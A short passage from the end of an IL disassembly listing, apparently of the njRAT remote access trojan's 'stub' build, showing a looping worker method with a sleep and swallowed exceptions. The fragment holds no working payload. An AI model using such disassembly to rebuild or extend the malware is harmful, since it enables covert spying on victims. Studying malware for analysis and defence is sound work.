      IL_0136:  ldc.i4.1
      IL_0137:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_013c:  br         IL_0055

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0141:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0146:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_014b:  leave.s    IL_014d

    }  // end handler
    IL_014d:  ret
  } // end of method kl::WRK

} // end of class k.kl


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file G:\NJRAT\NJRAT\bin\Debug\stub.res
